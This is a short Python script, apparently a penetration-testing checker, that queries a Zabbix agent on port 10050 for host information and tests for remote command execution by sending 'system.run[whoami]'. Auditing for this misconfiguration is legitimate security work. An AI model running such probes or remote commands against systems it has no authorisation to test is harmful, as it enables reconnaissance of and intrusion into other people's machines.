import socket

def send_zabbix_key(ip, port, key):
    try:
        with socket.create_connection((ip, port), timeout=5) as sock:
            sock.sendall((key + '\n').encode('utf-8'))
            response = sock.recv(4096)
            return response.decode('utf-8', errors='ignore').strip()
    except Exception as e:
        return f"[!] Connection error: {e}"

def test_zabbix_agent(ip, port=10050):
    print(f"[+] Testing Zabbix Agent on {ip}:{port}\n")

    # Test basic info keys
    test_keys = [
        "agent.hostname",
        "system.uptime",
        "system.cpu.load[percpu,avg1]",
        "vfs.fs.size[c:,free]"
    ]

    for key in test_keys:
        print(f"[>] Sending key: {key}")
        result = send_zabbix_key(ip, port, key)
        print(f"[<] Response: {result}\n")

    # Test for RCE via system.run
    print("[*] Testing for command execution (system.run[whoami]) ...")
    rce_key = "system.run[whoami]"
    rce_result = send_zabbix_key(ip, port, rce_key)

    if rce_result and "[!]" not in rce_result and "ZBX_NOTSUPPORTED" not in rce_result:
        print("[!!] Possible RCE! system.run[] is ENABLED!")
        print(f"[>>] Command output: {rce_result}")
    else:
        print("[x] system.run[] seems DISABLED or BLOCKED.")

if __name__ == "__main__":
    target_ip = input("Enter Zabbix Agent IP address: ").strip()
    test_zabbix_agent(target_ip)
